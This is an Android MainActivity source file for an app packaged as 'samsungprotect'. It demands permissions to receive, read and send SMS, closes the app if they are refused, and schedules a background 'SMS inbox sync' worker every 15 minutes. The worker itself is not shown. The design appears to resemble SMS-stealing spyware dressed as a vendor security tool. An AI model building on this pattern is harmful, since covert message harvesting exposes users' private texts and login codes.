package com.example.samsungprotect;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.example.samsungprotect.MonitoringService.SMSInboxWorker;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import java.util.concurrent.TimeUnit;

public class MainActivity extends AppCompatActivity {

    private static final int SMS_PERMISSION_CODE = 101;
    private static final String TAG = "MainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.i(TAG, "App started");

        if (!hasPermissions()) {
            Log.i(TAG, "Requesting permissions...");
            ActivityCompat.requestPermissions(this,
                    new String[]{
                            Manifest.permission.RECEIVE_SMS,
                            Manifest.permission.READ_SMS,
                            Manifest.permission.SEND_SMS
                    },
                    SMS_PERMISSION_CODE);
        } else {
            Log.i(TAG, "Permissions already granted");
            schedulePeriodicInboxWorker();

        }
    }

    private boolean hasPermissions() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == SMS_PERMISSION_CODE && hasPermissions()) {
            Log.i(TAG, "Permissions result approved");
            //SMSInboxWorker.runOnce(this); // 🔸 Run after permission granted
        } else {
            Log.e(TAG, "Permissions denied. Closing app.");
            finish();
        }
    }

    private void schedulePeriodicInboxWorker() {
        PeriodicWorkRequest periodicRequest =
                new PeriodicWorkRequest.Builder(SMSInboxWorker.class, 15, TimeUnit.MINUTES)
                        .build();

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                "SMSInboxSync",
                ExistingPeriodicWorkPolicy.KEEP,
                periodicRequest
        );

        Log.i(TAG, "Scheduled periodic SMS inbox sync every 15 minutes");
    }
}
